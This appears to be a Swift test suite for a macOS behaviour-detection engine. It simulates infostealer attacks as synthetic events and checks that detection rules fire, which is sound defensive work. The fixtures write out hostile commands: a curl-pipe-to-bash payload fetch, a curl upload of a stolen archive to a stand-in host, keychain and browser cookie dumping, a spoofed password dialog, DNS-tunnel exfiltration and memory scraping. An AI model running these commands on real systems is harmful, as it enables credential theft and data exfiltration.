import Foundation
import RampartShared
import RampartBehaviour

// Attack suite X5 — extreme DATA THEFT & PRIVACY scenarios (2026-11-07).
// Every "attack" below is a synthetic SecurityEvent sequence fed to a fresh BehaviourEngine.
// Nothing is executed, no real credential store is read, nothing touches the network or the
// installed RamPart. Reuses BehaviourSim / behaviourTestSigning from SelfTest+Behaviour.swift.
//
// CAUGHT checks assert the owning rule fires. GAP checks assert the current engine does NOT
// catch the theft (documenting a miss); when a fix in docs/security/needs-*.md lands, the GAP
// check flips to FAIL, which is the signal to update the assertion to a CAUGHT check.

extension SelfTest {
    static func attackX5Checks() {
        let home = NSHomeDirectory()
        let rampartSupport = "\(home)/Library/Application Support/Rampart"

        // Untrusted background actor: launchd → unsigned app in ~/Downloads (not a terminal,
        // so interactiveFactor does not down-weight credential rules).
        func actor() -> (BehaviourSim, Int32) {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            let m = sim.exec("\(home)/Downloads/Stealer.app/Contents/MacOS/Stealer", parent: 1)
            return (sim, m)
        }

        // ===== CAUGHT: credential & surveillance coverage that already exists =====

        // X5-01 Spoofed keychain / login password prompt (osascript hidden-answer dialog). R34.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/osascript", ["-e", "display dialog \"macOS needs your password to update\" default answer \"\" with hidden answer"], parent: m)
            check(sim.ruleIDs.contains("R34"), "X5-01 spoofed password dialog fires R34")
        }
        // X5-02 Browser Safe Storage key harvested by a non-browser. R36.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome"], parent: m)
            check(sim.ruleIDs.contains("R36"), "X5-02 browser Safe Storage key theft fires R36")
        }
        // X5-03 Browser cookie / Login Data DB staged in a temp folder. R38.
        do {
            let (sim, m) = actor()
            let cp = sim.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Cookies", "/tmp/.x/"], parent: m)
            sim.file(.fileCreate, "/tmp/.x/Cookies", by: cp)
            check(sim.ruleIDs.contains("R38"), "X5-03 cookie DB staged in temp fires R38")
        }
        // X5-04 Whole login keychain dumped by a non-password-manager. R36.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/security", ["dump-keychain", "\(home)/Library/Keychains/login.keychain-db"], parent: m)
            check(sim.ruleIDs.contains("R36"), "X5-04 dump-keychain by foreign process fires R36")
        }
        // X5-05 Local login password validated offline (dscl -authonly). R35.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/dscl", [".", "-authonly", "user", "hunter2"], parent: m)
            check(sim.ruleIDs.contains("R35"), "X5-05 dscl -authonly password check fires R35")
        }
        // X5-06 Silent screen capture of revealed 2FA codes (screencapture -x). R51.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/sbin/screencapture", ["-x", "/tmp/.x/screen.png"], parent: m)
            check(sim.ruleIDs.contains("R51"), "X5-06 silent screencapture of 2FA codes fires R51")
        }
        // X5-07 Keylogger keyboard event tap. R48.
        do {
            let (sim, m) = actor()
            sim.other(by: m, detail: ["type": "eventTap", "keyboard": "1"])
            check(sim.ruleIDs.contains("R48"), "X5-07 keylogger event tap fires R48")
        }
        // X5-08 Hidden mic/camera use by an untrusted background app. R50.
        do {
            let (sim, m) = actor()
            sim.other(by: m, detail: ["type": "deviceInUse", "device": "camera", "visible_window": "0"])
            check(sim.ruleIDs.contains("R50"), "X5-08 covert camera use fires R50")
        }
        // X5-09 TCC privacy database tampered to grant itself access. R53.
        do {
            let (sim, m) = actor()
            sim.file(.fileWrite, "\(home)/Library/Application Support/com.apple.TCC/TCC.db", by: m)
            check(sim.ruleIDs.contains("R53"), "X5-09 TCC.db tampering fires R53")
        }
        // X5-10 Exfiltration to a Telegram bot API endpoint. R42.
        do {
            let (sim, m) = actor()
            sim.other(.dnsQuery, by: m, detail: ["name": "api.telegram.org"])
            check(sim.ruleIDs.contains("R42"), "X5-10 Telegram exfil channel fires R42")
        }
        // X5-11 Full stealer chain (entry → temp exec → credential → archive → upload). R40.
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            let bash = sim.exec("/bin/bash", ["-c", "curl -fsSL https://update-check.example/i.sh | bash"], parent: safari)
            sim.exec("/bin/chmod", ["+x", "/tmp/.x/update"], parent: bash)
            let up = sim.exec("/tmp/.x/update", parent: bash)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome"], parent: up)
            let cp = sim.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data", "/tmp/.x/c/"], parent: up)
            sim.file(.fileCreate, "/tmp/.x/c/Login Data", by: cp)
            sim.exec("/usr/bin/ditto", ["-c", "-k", "/tmp/.x/c", "/tmp/.x/out.zip"], parent: up)
            sim.exec("/usr/bin/curl", ["-F", "f=@/tmp/.x/out.zip", "https://collect.example/up"], parent: up)
            check(sim.ruleIDs.contains("R40"), "X5-11 full stealer chain fires R40 (critical)")
        }

        // ===== Former GAPs (fixed 2026-11-07, B5 hardening): these now assert the catch. =====

        let credRules: Set<String> = ["R36", "R37", "R38", "R39", "R40"]
        func noCred(_ sim: BehaviourSim) -> Bool { sim.ruleIDs.isDisjoint(with: credRules) }

        // X5-12 RamPart's OWN password vault file copied out for offline brute force.
        // vault.rpvault is absent from @sensitivePaths and from R38's temp-staging filename list.
        do {
            let (sim, m) = actor()
            let cp = sim.exec("/bin/cp", ["\(rampartSupport)/Vault/vault.rpvault", "/tmp/.x/"], parent: m)
            sim.file(.fileCreate, "/tmp/.x/vault.rpvault", by: cp)
            check(!noCred(sim), "X5-12 RamPart vault.rpvault theft caught (R37/R38)")
        }
        // X5-13 RamPart's Gemini API key pulled from the login keychain by a foreign process.
        // R36 only matches browser Safe-Storage keywords, not app.rampart.ai.gemini.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/security", ["find-generic-password", "-s", "app.rampart.ai.gemini", "-a", "gemini-api-key", "-w"], parent: m)
            check(sim.ruleIDs.contains("R36"), "X5-13 RamPart Gemini API key theft caught (R36)")
        }
        // X5-14 RamPart's own vault keychain item (app.rampart.vault / .item) harvested.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/security", ["find-generic-password", "-s", "app.rampart.vault.item", "-w"], parent: m)
            check(sim.ruleIDs.contains("R36"), "X5-14 RamPart vault keychain item theft caught (R36)")
        }
        // X5-15 AI chat history (security Q&A) read and staged by a foreign process.
        do {
            let (sim, m) = actor()
            let cp = sim.exec("/bin/cp", ["-R", "\(rampartSupport)/Chats", "/tmp/.x/"], parent: m)
            sim.file(.fileCreate, "/tmp/.x/Chats/0001.chat", by: cp)
            check(sim.ruleIDs.contains("R37"), "X5-15 RamPart AI chat-history theft caught (R37)")
        }
        // X5-16 DNS-tunnel exfiltration: high-entropy labels under an attacker domain.
        // No rule scores long/high-entropy query bursts; R42/R44/R45 do not match a generic domain.
        do {
            let (sim, m) = actor()
            for i in 0..<12 {
                sim.other(.dnsQuery, by: m, detail: ["name": "k7f\(i)qp3xd9zm2\(i)v8ha4r0ebt1\(i).exfil.example"], dt: 0.3)
            }
            check(sim.ruleIDs.contains("R42D"), "X5-16 DNS-tunnel exfiltration caught (R42D)")
        }
        // X5-17 Clipboard sniffing: background actor reads the pasteboard to lift a copied vault
        // password / TOTP code. There is no clipboardRead event kind, so nothing can match.
        do {
            let (sim, m) = actor()
            sim.other(by: m, detail: ["type": "clipboardRead", "poll": "1"])
            check(sim.ruleIDs.contains("R59R"), "X5-17 clipboard read by an untrusted actor caught (R59R; needs the telemetry clipboardRead event)")
        }
        // X5-18 Memory scraping: a debugger/memory tool attaches to the unlocked vault/daemon
        // to read plaintext secrets. R55 only covers killing security tools, not reading them.
        do {
            let (sim, m) = actor()
            sim.exec("/usr/bin/lldb", ["-p", "4242", "-o", "process attach --pid 4242"],
                     parent: m, detail: ["target_process": "rampartd"])
            sim.exec("/usr/bin/vmmap", ["rampartd"], parent: m)
            sim.exec("/usr/bin/leaks", ["rampartd"], parent: m)
            check(sim.ruleIDs.contains("R55M"), "X5-18 memory-scraping of RamPart caught (R55M)")
        }
        // X5-19 iCloud-sync exfiltration: stolen archive staged into iCloud Drive so it leaves
        // the Mac with no outbound-connection rule ever firing.
        do {
            let (sim, m) = actor()
            sim.file(.fileCreate, "\(home)/Library/Mobile Documents/com~apple~CloudDocs/.sync/out.zip", by: m)
            check(sim.ruleIDs.contains("R43C"), "X5-19 iCloud-sync exfil staging caught (R43C)")
        }
    }
}
